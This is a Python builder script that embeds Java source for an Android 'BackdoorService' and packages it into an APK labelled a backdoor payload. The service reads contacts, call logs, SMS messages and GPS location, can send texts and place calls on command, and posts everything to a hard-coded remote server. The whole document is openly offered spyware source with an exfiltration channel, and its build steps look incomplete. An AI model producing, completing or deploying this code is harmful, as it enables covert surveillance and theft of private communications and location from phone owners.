import os
import sys
import subprocess
import argparse

# Define the Java code for the backdoor application
JAVA_CODE = '''
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.os.IBinder;
import android.provider.ContactsContract;
import android.provider.CallLog;
import android.provider.Telephony;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;
import android.location.Location;
import android.location.LocationManager;

import java.io.IOException;
import java.io.OutputStreamWriter;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.List;

public class BackdoorService extends Service {

    private static final String SERVER_URL = "http://10.0.1.33:9999";

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        String command = intent.getStringExtra("command");
        if (command != null) {
            switch (command) {
                case "dump_contacts":
                    dumpContacts();
                    break;
                case "dump_calllog":
                    dumpCallLog();
                    break;
                case "dump_sms":
                    dumpSMS();
                    break;
                case "send_sms":
                    String targetNumber = intent.getStringExtra("target");
                    String message = intent.getStringExtra("message");
                    sendSMS(targetNumber, message);
                    break;
                case "call":
                    String phoneNumber = intent.getStringExtra("target");
                    call(phoneNumber);
                    break;
                case "geolocate":
                    geolocate();
                    break;
            }
        }
        return START_NOT_STICKY;
    }

    private void dumpContacts() {
        Cursor cursor = getContentResolver().query(ContactsContract.Contacts.CONTENT_URI, null, null, null, null);
        if (cursor != null) {
            while (cursor.moveToNext()) {
                String contactName = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));
                sendToServer("Contact: " + contactName);
            }
            cursor.close();
        }
    }

    private void dumpCallLog() {
        Cursor cursor = getContentResolver().query(CallLog.Calls.CONTENT_URI, null, null, null, null);
        if (cursor != null) {
            while (cursor.moveToNext()) {
                String callNumber = cursor.getString(cursor.getColumnIndex(CallLog.Calls.NUMBER));
                sendToServer("Call: " + callNumber);
            }
            cursor.close();
        }
    }

    private void dumpSMS() {
        Cursor cursor = getContentResolver().query(Telephony.Sms.CONTENT_URI, null, null, null, null);
        if (cursor != null) {
            while (cursor.moveToNext()) {
                String smsBody = cursor.getString(cursor.getColumnIndex(Telephony.Sms.BODY));
                sendToServer("SMS: " + smsBody);
            }
            cursor.close();
        }
    }

    private void sendSMS(String targetNumber, String message) {
        SmsManager smsManager = SmsManager.getDefault();
        smsManager.sendTextMessage(targetNumber, null, message, null, null);
        sendToServer("Sent SMS to " + targetNumber);
    }

    private void call(String phoneNumber) {
        Intent callIntent = new Intent(Intent.ACTION_CALL);
        callIntent.setData(Uri.parse("tel:" + phoneNumber));
        callIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        startActivity(callIntent);
        sendToServer("Called " + phoneNumber);
    }

    private void geolocate() {
        LocationManager locationManager = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
        try {
            Location location = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER);
            if (location != null) {
                String locationString = "Lat: " + location.getLatitude() + " Lon: " + location.getLongitude();
                sendToServer("Location: " + locationString);
            }
        } catch (SecurityException e) {
            e.printStackTrace();
        }
    }

    private void sendToServer(String data) {
        try {
            URL url = new URL(SERVER_URL);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setDoOutput(true);
            OutputStreamWriter writer = new OutputStreamWriter(conn.getOutputStream());
            writer.write(data);
            writer.flush();
            writer.close();
            conn.getResponseCode();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}
'''

def create_java_file():
    with open("BackdoorService.java", "w") as java_file:
        java_file.write(JAVA_CODE)

def compile_java():
    subprocess.run(["javac", "BackdoorService.java"])

def create_apk(output):
    # Use apktool to create the apk
    subprocess.run(["apktool", "b", "BackdoorService", "-o", output])

def main():
    parser = argparse.ArgumentParser(description="Generate a backdoor APK payload.")
    parser.add_argument("-o", "--output", required=True, help="Output APK file")
    args = parser.parse_args()

    create_java_file()
    compile_java()
    create_apk(args.output)

if __name__ == "__main__":
    main()
